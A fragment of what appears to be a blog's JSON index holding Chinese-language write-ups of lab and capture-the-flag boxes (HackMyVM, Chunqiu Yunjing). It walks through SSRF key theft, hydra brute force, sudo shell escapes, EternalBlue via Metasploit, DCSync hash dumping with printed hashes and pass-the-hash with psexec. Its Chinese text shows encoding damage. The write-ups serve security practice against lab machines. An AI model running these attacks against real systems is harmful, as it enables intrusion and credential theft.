1\nwelcome@Byxs20:/home/welcome$ mkdir test\nmkdir test\nwelcome@Byxs20:/home/welcome$ echo 'bash -p'>test/test\necho 'bash -p'>test/test\nwelcome@Byxs20:/home/welcome$ chmod +x test/test\nchmod +x test/test\nwelcome@Byxs20:/home/welcome$ sudo /home/welcome/test/test\nsudo /home/welcome/test/test\nroot@Byxs20:/home/welcome#\n~~~\n\n","tags":["é¶æœº"],"categories":["660930334"]},{"title":"ç¾¤å‹æœº-Anjy","url":"/2025/04/19/ç¾¤å‹é¶æœº-Anjy/","content":"\n\n\n\n\n\n\n# ä¿¡æ¯æœé›†\n\narp-scan -læ‰«æé¶æœºåœ°å€\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:da:a9:b6       PCS Systemtechnik GmbH\n192.168.31.147  08:00:27:e8:2b:5e       PCS Systemtechnik GmbH\n\n3 packets received by filter, 0 packets dropped by kernel\n~~~\n\n192.168.31.147å°±æ˜¯é¶æœºipï¼Œç„¶ånmapæ‰«æç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.147\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-19 04:25 EDT\nNmap scan report for 192.168.31.147\nHost is up (0.0014s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:E8:2B:5E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 6.88 seconds\n~~~\n\n# 80ç«¯å£\n\n80ç«¯å£æ˜¯ä¸€ä¸ªwebé¡µé¢å­˜åœ¨ssrfæ¼æ´ï¼ŒPOSTä¼ å‚`url=file:///etc/passwd`ï¼Œæ–‡ä»¶å†…å®¹ä¼šè¿›è¡Œbase64åŠ å¯†\n\nå¯ä»¥è¯»å–åˆ°welcomeè¿™ä¸ªç”¨æˆ·ï¼Œhomeç›®å½•ä¸‹ä¸å­˜åœ¨id_rsa,è¯»å–/etc/ssh/sshd_config\n\n~~~\n#HostKey /etc/ssh/ssh_host_rsa_key\n#HostKey /etc/ssh/ssh_host_ecdsa_key\n#HostKey /etc/ssh/ssh_host_ed25519_key\n~~~\n\nç„¶åæŒ¨ä¸ªè¯•è¯•id_rsa,id_ecdsa,id_ed25519,å¯ä»¥å‘ç°å­˜åœ¨`id_ed25519`\n\n~~~\nurl=file:///home/welcome/.ssh/id_ed25519\n~~~\n\næ‹¿åˆ°ç§é’¥äº†å°±å¯ä»¥sshç™»å½•äº†\n\n# ææƒ\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# ssh welcome@192.168.31.147 -i id\nLinux Anjv 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sat Apr 19 04:31:17 2025 from 192.168.31.129\nwelcome@Anjv:~$\n~~~\n\nsudo -lå¯ä»¥å‘ç°elinkså¯ä»¥ä»¥rootç”¨æˆ·æ‰§è¡Œï¼Œå¯ä»¥ç›´æ¥è¯»å–root.txtï¼Œä¹Ÿå¯ä»¥ä»»æ„æ–‡ä»¶è¯»å†™ï¼Œæœ€ç®€å•çš„æ˜¯å†elinksç»ˆç«¯æŒ‰ä¸‹esc->file->OS SHELL\n\nå°±å¯ä»¥è·å–åˆ°rootçš„shelläº†\n","tags":["é¶æœº"],"categories":["660930334"]},{"title":"HackmyVM-find","url":"/2025/04/19/HackmyVM-find/","content":"\n\n\n# ä¿¡æ¯æœé›†\n\narp-scan -l\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:dd:48:d1       PCS Systemtechnik GmbH\n192.168.31.145  08:00:27:19:2f:ed       PCS Systemtechnik GmbH\n~~~\n\n192.168.31.145æ˜¯é¶æœºipï¼Œæ‰«æä¸€ä¸‹ç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.145\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-18 23:23 EDT\nNmap scan report for 192.168.31.145\nHost is up (0.0022s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:19:2F:ED (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 6.86 seconds\n~~~\n\næ‰«æç›®å½•\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# gobuster dir -u \"http://192.168.31.145/\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-m\nedium.txt -x .php,.txt,.jpg\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.145/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              txt,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/cat.jpg              (Status: 200) [Size: 35137]\n/manual               (Status: 301) [Size: 317] [--> http://192.168.31.145/manual/]\n/robots.txt           (Status: 200) [Size: 13]\n/server-status        (Status: 403) [Size: 279]\n~~~\n\n# user.txt\n\nrobots.txtæ˜¯è®©ä½ æ‰¾åˆ°user,æŠŠcat.jpgä¸‹è½½ä¸‹æ¥\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# strings cat.jpg\n...\n>C<;_\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJ`_dcba`_^]\\Uy<XW\nVOsrRKPONGk.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONML\nKJIHGFEDZY^W\\[ZYXWPOsSRQPON0Fj-IHAeR\n~~~\n\næœ€åä¸€ä¸²å­—ç¬¦ä¸²æ˜¯[Malbolge](https://malbolge.doleczek.pl/)è¯­è¨€ï¼Œè·‘ä¸€ä¸‹å¾—åˆ°`missyred`ï¼Œç„¶åhydraçˆ†ç ´å¯†ç \n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# hydra -l missyred -P /usr/share/wordlists/rockyou.txt 192.168.31.145 ssh\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-18 23:30:36\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking ssh://192.168.31.145:22/\n[22][ssh] host: 192.168.31.145   login: missyred   password: iloveyou\n~~~\n\nsshç™»å½•,sudo -l\n\n~~~\nmissyred@find:~$ sudo -l\n[sudo] password for missyred:\nMatching Defaults entries for missyred on find:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser missyred may run the following commands on find:\n    (kings) /usr/bin/perl\n~~~\n\nperlææƒåˆ°kings\n\n~~~\nmissyred@find:~$ sudo -u kings perl -e 'exec \"/bin/sh\";'\n~~~\n\n# root.txt\n\n~~~\nkings@find:~$ sudo -l\nMatching Defaults entries for kings on find:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser kings may run the following commands on find:\n    (ALL) NOPASSWD: /opt/boom/boom.sh\n~~~\n\n/opt/boom/boom.shæ˜¯ä¸å­˜åœ¨çš„ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±åˆ›å»ºï¼Œéšä¾¿æ‰§è¡Œshå‘½ä»¤\n\n~~~\n#boom.sh\nbash -p\n~~~\n\nsudo /opt/boom/boom.sh\n\nææƒåˆ°root.txt\n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"HackmyVM-hotel","url":"/2025/04/19/HackmyVM-hotel/","content":"\n\n\n# ä¿¡æ¯æœé›†\n\narp-scan -l\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:f8:3e:94       PCS Systemtechnik GmbH\n192.168.31.144  08:00:27:5c:e1:4f       PCS Systemtechnik GmbH\n~~~\n\n192.168.31.144å°±æ˜¯é¶æœºipï¼Œæ‰«æç«¯å£\n\n~~~\nPORT   STATE SERVICE REASON\n22/tcp open  ssh     syn-ack ttl 64\n80/tcp open  http    syn-ack ttl 64\n~~~\n\nå¼€å¯äº†22å’Œ80ç«¯å£\n\n# user.txt\n\n80ç«¯å£æ˜¯ä¸€ä¸ªhoteldruidï¼Œå­˜åœ¨ndayhttps://github.com/kaal18/CVE-2022-22909#\n\nåå¼¹ä¸€ä¸ªshellå‡ºæ¥ï¼Œ/var/www/htmlç›®å½•ä¸‹æœ‰ä¸€ä¸ªttylogå¾ˆå¯ç–‘ï¼Œç”¨ttyplayå¯ä»¥é‡ç°å½“æ—¶å½•åˆ¶çš„tty\n\nå¾—åˆ°personçš„å¯†ç ä¸º\n\n~~~\nEndur4nc3.\n~~~\n\nsshç™»å½•ï¼Œæ‹¿åˆ°user.txt\n\n# root.txt\n\nsudo -l\n\n~~~\nperson@hotel:~$ sudo -l\nMatching Defaults entries for person on hotel:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser person may run the following commands on hotel:\n    (root) NOPASSWD: /usr/bin/wkhtmltopdf\n~~~\n\nsudo /usr/bin/wkhtmltopdf file:///root/root.txt 1.pdfå¯ä»¥æ‹¿åˆ°root.txt\n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"æ˜¥ç§‹äº‘é•œ-Initial","url":"/2025/04/18/æ˜¥ç§‹äº‘é•œ-Initial/","content":"\n\n\n\n\n# FLAG1\n\né¦–å…ˆè¿›è¡Œä¿¡æ¯æœé›†\n\n~~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# ../pentest/fscan/fscan2 -h 39.99.232.66\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     ___  ___ _ __ __ _  ___| | __    â”‚\nâ”‚  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-04-18 08:00:46] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-04-18 08:00:46] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-04-18 08:00:46] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1\n[2025-04-18 08:00:46] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-04-18 08:00:46] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\n[2025-04-18 08:00:46] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.232.66:22\n[2025-04-18 08:00:46] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.232.66:80\n[2025-04-18 08:00:46] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.232.66:22 => [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.5 äº§å“:OpenSSH ç³»ç»Ÿ:Linux  ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-04-18 08:00:51] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.232.66:80 => [http]\n[2025-04-18 08:00:55] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 2\n[2025-04-18 08:00:55] [INFO] å¼€å§‹æ¼æ´æ‰«æ\n[2025-04-18 08:00:55] [INFO] åŠ è½½çš„æ’ä»¶: ssh, webpoc, webtitle\n[2025-04-18 08:00:55] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.99.232.66       çŠ¶æ€ç :200 é•¿åº¦:5578   æ ‡é¢˜:Bootstrap Material Admin\n[2025-04-18 08:00:57] [SUCCESS] ç›®æ ‡: http://39.99.232.66:80\n  æ¼æ´ç±»å‹: poc-yaml-thinkphp5023-method-rce\n  æ¼æ´åç§°: poc1\n  è¯¦ç»†ä¿¡æ¯:\n        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce\n[2025-04-18 08:01:01] [SUCCESS] æ‰«æå·²å®Œæˆ: 3/3\n~~~~\n\n80ç«¯å£å­˜åœ¨thinkphpçš„æ¼æ´ï¼Œç›´æ¥å·¥å…·ä¸€æŠŠæ¢­äº†ï¼Œæ‹¿åˆ°shellåæä¸€ä¸‹æƒ,sudoå¯ä»¥æ— å¯†ç æ‰§è¡Œmysqlï¼Œmysqlææƒ\n\n~~~\n(www-data:/) $ sudo -l\nMatching Defaults entries for www-data on ubuntu-web01:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\nUser www-data may run the following commands on ubuntu-web01:\n    (root) NOPASSWD: /usr/bin/mysql\n~~~\n\n~~~4\nsudo mysql -e '\\! cat /root/flag/flag01.txt'\n~~~\n\næ‹¿åˆ°äº†flagçš„ç¬¬ä¸€éƒ¨åˆ†\n\n# FLAG2&&FLAG3\n\nå†™ä¸€ä¸ªå…¬é’¥è¿›å»ï¼Œç„¶åsshç™»å½•ï¼Œä¸Šä¼ fscanå†åšä¸€ä¸ªä»£ç†\n\n~~~\n(www-data:/tmp) $ ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e:25:0c:72 brd ff:ff:ff:ff:ff:ff\n    inet 172.22.1.15/16 brd 172.22.255.255 scope global dynamic eth0\n       valid_lft 315359017sec preferred_lft 315359017sec\n    inet6 fe80::216:3eff:fe25:c72/64 scope link \n       valid_lft forever preferred_lft forever\n~~~\n\n~~~\nroot@ubuntu-web01:~# ./fscan -h 172.22.1.15/24\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     ___  ___ _ __ __ _  ___| | __    â”‚\nâ”‚  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-04-18 20:14:45] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-04-18 20:14:45] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-04-18 20:14:45] [INFO] CIDRèŒƒå›´: 172.22.1.0-172.22.1.255\n[2025-04-18 20:14:45] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.1.0.%!d(string=172.22.1.255) - %!s(MISSING).%!d(MISSING)\n[2025-04-18 20:14:45] [INFO] è§£æCIDR 172.22.1.15/24 -> IPèŒƒå›´ 172.22.1.0-172.22.1.255\n[2025-04-18 20:14:45] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256\n[2025-04-18 20:14:45] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-04-18 20:14:45] [SUCCESS] ç›®æ ‡ 172.22.1.15     å­˜æ´» (ICMP)\n[2025-04-18 20:14:45] [SUCCESS] ç›®æ ‡ 172.22.1.21     å­˜æ´» (ICMP)\n[2025-04-18 20:14:45] [SUCCESS] ç›®æ ‡ 172.22.1.2      å­˜æ´» (ICMP)\n[2025-04-18 20:14:45] [SUCCESS] ç›®æ ‡ 172.22.1.18     å­˜æ´» (ICMP)\n[2025-04-18 20:14:48] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4\n[2025-04-18 20:14:48] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\n[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.2:88\n[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.18:80\n[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.15:80\n[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.15:22\n[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.18:445\n[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.2:445\n[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.21:445\n[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.2:389\n[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.2:139\n[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.18:139\n[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.21:139\n[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.18:135\n[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.2:135\n[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.21:135\n[2025-04-18 20:14:48] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.1.18:3306\n[2025-04-18 20:14:49] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.15:22 => [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.5 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-04-18 20:14:53] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.18:3306 => [mysql] äº§å“:MySQL ä¿¡æ¯:unauthorized Banner:[D.j Host '172.22.1.15' is not allowed to connect to this MySQL server]\n[2025-04-18 20:14:53] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.2:88 =>\n[2025-04-18 20:14:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.18:445 =>\n[2025-04-18 20:14:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.2:445 =>\n[2025-04-18 20:14:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.21:445 =>\n[2025-04-18 20:14:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.2:389 => [ldap] äº§å“:Microsoft Windows Active Directory LDAP ç³»ç»Ÿ:Windows ä¿¡æ¯:Domain: xiaorang.lab, Site: Default-First-Site-Name\n[2025-04-18 20:14:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.2:139 =>  Banner:[.]\n[2025-04-18 20:14:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.18:139 =>  Banner:[.]\n[2025-04-18 20:14:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.21:139 =>  Banner:[.]\n[2025-04-18 20:14:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.18:80 => [http]\n[2025-04-18 20:14:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.15:80 => [http]\n\n[2025-04-18 20:15:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.18:135 =>\n[2025-04-18 20:15:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.2:135 =>\n[2025-04-18 20:15:54] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.1.21:135 =>\n[2025-04-18 20:15:54] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 15\n[2025-04-18 20:15:54] [INFO] å¼€å§‹æ¼æ´æ‰«æ\n[2025-04-18 20:15:54] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle\n[2025-04-18 20:15:54] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 172.22.1.21\nä¸»æœºå: XIAORANG-WIN7\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4åœ°å€:\n      â””â”€ 172.22.1.21\n[2025-04-18 20:15:54] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 172.22.1.2\nä¸»æœºå: DC01\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4åœ°å€:\n      â””â”€ 172.22.1.2\n[2025-04-18 20:15:54] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 172.22.1.18\nä¸»æœºå: XIAORANG-OA01\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4åœ°å€:\n      â””â”€ 172.22.1.18\n[2025-04-18 20:15:54] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.1.15        çŠ¶æ€ç :200 é•¿åº¦:5578   æ ‡é¢˜:Bootstrap Material Admin\n[2025-04-18 20:15:54] [INFO] ç³»ç»Ÿä¿¡æ¯ 172.22.1.2 [Windows Server 2016 Datacenter 14393]\n[2025-04-18 20:15:54] [SUCCESS] NetBios 172.22.1.2      DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393\n[2025-04-18 20:15:54] [SUCCESS] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1\n[2025-04-18 20:15:54] [SUCCESS] å‘ç°æ¼æ´ 172.22.1.21 [Windows Server 2008 R2 Enterprise 7601 Service Pack 1] MS17-010\n[2025-04-18 20:15:54] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.1.18        çŠ¶æ€ç :302 é•¿åº¦:0      æ ‡é¢˜:æ— æ ‡é¢˜ é‡å®šå‘åœ°å€: http://172.22.1.18?m=login\n[2025-04-18 20:15:54] [SUCCESS] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600\n[2025-04-18 20:15:55] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.1.18?m=login çŠ¶æ€ç :200 é•¿åº¦:4012   æ ‡é¢˜:ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿ\n[2025-04-18 20:15:55] [SUCCESS] ç›®æ ‡: http://172.22.1.15:80\n  æ¼æ´ç±»å‹: poc-yaml-thinkphp5023-method-rce\n  æ¼æ´åç§°: poc1\n  è¯¦ç»†ä¿¡æ¯:\n        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce\n~~~\n\n 172.22.1.21 æœ‰æ°¸æ’ä¹‹è“ï¼Œä¸Šmsfæ¢­å“ˆ\n\n~~~\nproxychains4 msfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset payload windows/x64/meterpreter/bind_tcp_uuid\nset RHOSTS 172.22.1.21\nexploit\n~~~\n\næ”¶é›†ä¸€äº›åŸŸå†…å“ˆå¸Œ\n\n~~~\nmeterpreter > load kiwi\nmeterpreter > kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv\n[DC] 'xiaorang.lab' will be the domain\n[DC] 'DC01.xiaorang.lab' will be the DC server\n[DC] Exporting domain 'xiaorang.lab'\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514\n1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512\n1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512\n1000    DC01$   09bb349ab17bbe480b91eb20bb204bee        532480\n500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512\n1104    XIAORANG-OA01$  25e4b9f501c8831b0568fcc61e4ddc7f        4096\n1108    XIAORANG-WIN7$  acf1bc550440e81c9f2663ff304b4ab3        4096\n~~~\n\næœ‰åŸŸæ§çš„å“ˆå¸Œäº†ç›´æ¥æ‰“åŸŸæ§ï¼Œç„¶åå°±å¯ä»¥ä¸ºæ‰€æ¬²ä¸ºäº†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# impacket-psexec  -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/Administrator@172.22.1.2 -codec gbk\nC:\\Users\\Administrator\\flag> type flag03.txt\n~~~\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# impacket-psexec  -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/Administrator@172.22.1.18 -codec gbk\nC:\\Users\\Administrator\\flag> type flag02.txt\n~~~\n\n---\n\n\n\nçœ‹åˆ«äººçš„wpï¼Œå¥½åƒæ˜¯è¦å…ˆæ‰“172.22.1.18ï¼Œæ˜¯ä¸€ä¸ªOAç³»ç»Ÿå¯ä»¥æ‰“ndayä¸€æŠŠæ¢­ï¼Œæˆ‘å°±ä¸çœ‹äº†\n","tags":["é¶æœº"],"categories":["æ˜¥ç§‹äº‘é•œ"]},{"title":"æ˜¥ç§‹äº‘é•œ-Delegation","url":"/2025/04/18/æ˜¥ç§‹äº‘é•œ-Delegation/","content":"\n\n\n# FLAG1\n\né¦–å…ˆå¯¹é¶æœºè¿›è¡Œä¿¡æ¯æœé›†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# ../pentest/fscan/fscan2 -h 39.99.130.13\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     ___  ___ _ __ __ _  ___| | __    â”‚\nâ”‚  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    